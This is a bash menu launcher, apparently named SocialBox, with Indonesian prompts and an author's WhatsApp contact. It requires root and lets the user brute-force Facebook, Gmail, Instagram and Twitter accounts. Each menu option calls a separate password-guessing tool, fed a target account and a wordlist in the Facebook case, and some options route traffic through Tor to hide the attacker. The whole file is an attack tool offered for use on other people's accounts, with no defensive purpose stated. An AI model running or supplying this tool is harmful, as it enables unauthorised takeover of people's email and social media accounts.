#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
#ROOT PRIVILEGIES
if [[ $EUID -ne 0 ]]; then
       echo -e "$red Untuk Menjalankan Script Ini Anda Harus Menjalankan Akses Root.$nc"
       exit 1
fi
#Installation
sleep 1
echo -e "Mengecek Bahan-Bahan $nc"
bash install-sb.sh
echo -e "Mengecek Selesai [$green✓$nc] $nc "
sleep 1
clear
#Startup
echo -e "$green"
echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v1$nc" 
echo -e "	[+]              $red Coded By Subhan Fadilah$nc                    		        [+]"
echo -e "	[+] 	       $red http://wa.me/+6285225218341$nc 	                                [+]"
echo -e "	[+]	      $red Terimakasih To All Pentesters$nc               		        [+]"
echo -e "	[+]$red Sangat berterima kasih kepada $nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles}$nc [+]"
echo ""
echo -e "$yellow Pilihan Menu : $nc"
echo ""
echo -e "		$Cyan 1 : Brute Force Akun Facebook$nc"
echo -e "		$Cyan 2 : Brute Force Akun Gmail$nc"
echo -e "		$Cyan 3 : Brute Force Akun Instagram$nc"
echo -e "		$Cyan 4 : Brute Force Akun Twitter$nc"
echo -e "		$Cyan 99: Keluar$nc"
read -p "Masukkan Pilihan >  " ch
if [ $ch = 1 ]; then
echo -e "			$Cyan Brute Force Facebook$nc"
echo -e "$green"
read -p "Masukkan Facebook ID / Email / Username / Nomor: " id
read -p "Masukkan wordlist Gans : " wordlist
echo -e "$nc"
cd facebook
perl fb-brute.pl $id $wordlist
echo -e " 		[+]$yellow Brute Force Selesai $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Apakah Anda Ingin Mengulang [ Y / n ] : " check
echo -e "$nc"
if [ $check = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 2 ]; then
echo -e "			$Cyan Brute Force Gmail$nc"
cd Gemail-Hack
python gemailhack.py
echo -e "               [+]$yellow Brute Force Selesai $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Apakah Anda Ingin Mengulang [ Y / n ] : " check2
echo -e "$nc"
if [ $check2 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 3 ]; then
echo -e "			$Cyan Brute Force Instagram$nc"
cd instainsane/
sleep 0.025
	echo -e "	[+]$red Tor Berjalan $nc[+]"
sleep 0.9
service tor start
./instainsane.sh
echo -e "               [+]$yellow Brute Force Selesai $nc[$green✓$nc] $nc[+]"
service tor stop
echo -e "		[+]$red Tor Berhenti$nc [+]"
echo -e "$red"
read -p "Apakah Ingin Mengulang [ Y / n ] : " check3
echo -e "$nc"
if [ $check3 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 4 ]; then
echo -e "			$Cyan Brute Force Twitter$nc"
cd tweetshell/
sleep 0.025
        echo -e "	[+]$red Tor Berjalan $nc[+]"
sleep 0.9
service tor start
bash tweetshell.sh
echo -e "               [+]$yellow Brute Force Selesai $nc[$green✓$nc] $nc[+]"
service tor stop
echo -e "		[+]$red Tor Berhenti $nc [+]"
echo -e "$red"
read -p "Apakah Ingin Mengulang [ Y / n ] : " check4
echo -e "$nc"
if [ $check4 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch == 99 ]; then
echo -e "$red Program Keluar ...$nc"
sleep 0.25
exit 1
else
echo "Program tidak Ada :("
exit 1
fi
